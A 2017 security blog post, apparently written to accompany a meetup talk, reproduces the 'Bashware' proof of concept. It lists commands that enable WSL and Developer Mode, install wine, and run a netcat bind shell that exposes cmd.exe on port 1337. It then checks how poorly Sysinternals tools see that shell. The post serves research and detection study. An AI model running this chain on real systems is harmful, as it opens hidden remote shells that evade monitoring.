---
title: "Executing Windows malware in Windows Subsystem for Linux (Bashware)"
date: 2017-10-24
categories:
- windows
- malware
- uac
- sysinternals
tags:
- poc
- bashware

thumbnailImagePosition: left
thumbnailImage: /img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/3.png
---

A blogpost that shows a practical approach to setting up malware to run on Windows using the Linux subsystem and wine to avoid detection.

<!--more-->

## Origin Story

I did a talk recently at the [Bangalore null/OWASP meetup](https://null.co.in/event_sessions/1672-bashware) where I spoke about and demoed the concept of the research done by [Check Point Security folks, called Bashware](https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/).

Bashware (bash+(mal)ware) is the idea of running Windows binaries (malware) in the [Windows Subsystem for Linux (WSL)](https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/) using wine support. This allows for some programs (not all Windows PE executables though) to be run inside WSL while being shielded from system inspection tools like Antivirus solutions, process monitor etc.

While setting up the demo for this talk, I realised that the speed of execution that is shown in the [video released by Check Point Security](https://www.youtube.com/watch?v=fwEQFMbHIV8) was very likely not possible as it took me couple of hours of setup and downloading/installing of components required to make this run from scratch. In the video, a binary called `malware.exe` is run and within a minute the binary does the following

1. Enables WSL
2. Enables Developer Mode
3. Installs WSL
4. Installs wine
5. Executes nc.exe -lvp 1337 via wine

In my opinion, the `malware.exe` simply runs the last command while everything else is already setup on the system. Let’s go ahead and build a PoC and see what we happens.


## Let’s build a PoC!

In any case, if you want to try setting this up, here are the commands that worked for me. This is 5 step process at the very least. You will need to be on a Windows 10 64 bit Edition machine with Windows 10 version higher than the Anniversary Update (version 1607).

### Step 1: Enable WSL

The Windows Subsystem for Linux can be enabled either by using the `dism` binary using an elevated command prompt or using Powershell’s `Enable-WindowsOptionalFeature` module as shown below. A reboot is required after this step

```
C:\>dism /Online /Enable-Feature /All /FeatureName:Microsoft-Windows-Subsystem-Linux /NoRestart
```

```
PS C:\> Enable-WindowsOptionalFeature -O -F Microsoft-Windows-Subsystem-Linux
```

### Step 2: Enable Developer mode (Optional)

Developer Mode in Windows 10 allows developers to install and test unsigned applications and was required to install WSL, [but post 16215, you no longer have to enable Developer Mode to install WSL](https://blogs.msdn.microsoft.com/commandline/2017/06/08/developer-mode-no-longer-required-for-windows-subsystem-for-linux/). I ran into some installation issues though which did not recur once I had enabled Developer Mode, so including this step here.

To enable Developer Mode, go to `Settings -> Update & Security -> For Developers` and click on the `Developer mode` radio button and click Yes on the message box that is shown


![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/1.png)

To script this or to do this via a command prompt, we can use the reg command to add registry values directly. The following command sets the required values in the Windows registry (requires elevation).

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" /v AllowAllTrustedApps /t REG_DWORD /d 1 /f
```

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock" /v AllowDevelopmentWithoutDevLicense /t REG_DWORD /d 0 /f
```

### Step 3: Install WSL and Linux components

This can be done via the `Turn Windows features on or off` applet as shown below

![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/2.png)

or using the command prompt with the lxrun command

```
lxrun /install /y
```

### Step 4: Install wine inside WSL

From the [Wine website](https://www.winehq.org/),

> Wine (originally an acronym for “Wine Is Not an Emulator”) is a compatibility layer capable of running Windows applications on several POSIX-compliant operating systems, such as Linux, macOS, & BSD. Instead of simulating internal Windows logic like a virtual machine or emulator, Wine translates Windows API calls into POSIX calls on-the-fly, eliminating the performance and memory penalties of other methods and allowing you to cleanly integrate Windows applications into your desktop.

Basically, Wine allows you to run Windows programs on Linux by translating Windows API calls to Linux (POSIX) equivalent API calls. Not all Windows programs can be run using Wine though, however [there are a large number of programs that do work](https://appdb.winehq.org/).

Anyways, Wine is required to run the Windows binary (malware) to complete this PoC for bashware. You can do this using a bash terminal in WSL. Open cmd and type bash and press enter to launch the WSL environment. In bash, type the following commands to enable 32 bit architecture support, add the Wine PPA, download and update the package lists from the repositories and finally install wine.

```
dpkg --add-architecture i386
add-apt-repository -y ppa:ubuntu-wine/ppa
apt-get update
apt-get install wine1.6-amd64
```

### Step 5: Download and run netcat 64 bit using wine

This was the trickiest of all the steps. The original research article on the Check Point Security website does not mention the binary type that will be eventually executed, although there are hints throughout the article.

Looking at the video and pausing at [0:12 seconds](https://youtu.be/fwEQFMbHIV8?t=12) I realized that the netcat binary used in the video was the original Hobbit version compiled by someone into its 64 bit equivalent on 26th December 2010. Using a little bit of Google search I found the exact binary that was used in the video, which I subsequently used in the demo as well.

So go ahead and grab a copy of netcat 1.11 from https://eternallybored.org/misc/netcat/

(You can compare the Date Modified of the files in the video and this download and chuckle along :D)

Finally, to run the netcat and complete the PoC, cd to the directory where you unzipped the download and run the following command (all in bash, obviously). You may very likely see multiple `preloader: Warning: failed to reserve range 00007ffffe000000-00007fffffff0000`. [You can ignore these warnings and proceed](https://github.com/Microsoft/BashOnWindows/issues/2258).

```
wine64 nc64.exe -e cmd.exe -lvp 1337
```

This will run the netcat binary inside WSL using wine. The netcat parameters in this command cause it to verbosely listen on port 1337 and execute and send STDIN, STDOUT and STDERR of cmd.exe back to the connecting client.

You can verify if the port is open using netstat or [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview)

```
C:\> netstat -anto | findstr "1337"
```

From a different machine or another command prompt window on the same computer connect to the open port using another copy of netcat (I used the nmap version) as such:

```
ncat 192.168.56.1 1337 -v
```

![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/3.png)

## Is this really stealthy?

Once the connection was established, I wanted to see if this can be detected by some common Windows system inspection tools. I used [TCPView](https://docs.microsoft.com/en-us/sysinternals/downloads/tcpview), [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer) and [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon). The results were interesting as expected.

### Using TcpView

TCPView provides a graphical UI to view all network connections, the teardowns and new connections being made along with the process information of the PID that created the connection.

In this case, TCPView was able to list the open port, attributing it to *wineserver*, but was unable to get more information.

![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/4.png)

### Using Process Explorer

Process Explorer was able to detect the wine64-preloader and the wineserver, but beyond that very little information was available.

![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/5.png)

The process memory and network listening status was all that was available in Process Explorer. The error message shown in place of the path is shown when (amongst other things) the handle of a privileged process, opened with [PROCESS_QUERY_LIMITED_INFORMATION, is used to call QueryFullProcessImageName](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx)

![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/6.png)

### Using Process Monitor

I had better luck with Process Monitor in looking at the process and the execution path. I would highly recommend trying this out on your own setup as the number of entries is just too many to go into details.

The wine64 binary path (on the Windows Filesystem) was detected as well as several `CreateFile`, `ReadFile` and `CloseFile` references to `nc64.exe` by a process that had no name or path (!?). The `LXCORE.SYS` driver was also visible in the stack of the process with various API calls to execute and manage the wine64 invocation of `nc64.exe`.

![](/img/executing-windows-malware-in-windows-subsystem-for-linux-bashware/7.png)

## Final Thoughts

In my opinion, the video and research published by the folks at Check Point Security had some glaring and obvious holes in it. But given the overall simplicity of execution and the absence of proper tools to inspect and analyze Windows binaries running through Wine through WSL (whew!), this can become very tricky very fast.

To be fair, it really is a lengthy process, requiring privileged execution, multiple reboots and Internet access. [No wonder Microsoft downplayed the whole thing as is](https://www.theregister.co.uk/2017/09/12/microsoft_downplays_bashware_malware_threat/). However, it cannot be denied that this is a cool technique at camouflaging execution.

As is always with any untrusted sources, practice caution when opening email attachments or executing downloaded content.

Till my next post, Happy Hacking!

PS: The slides from the talk that spurred this blogpost are at: https://www.slideshare.net/riyazwalikar/executing-windows-malware-through-wsl-bashware


## References:

- https://research.checkpoint.com/beware-bashware-new-method-malware-bypass-security-solutions/
- https://www.youtube.com/watch?v=fwEQFMbHIV8
- https://blogs.msdn.microsoft.com/wsl/2016/04/22/windows-subsystem-for-linux-overview/

Happy Hacking!

---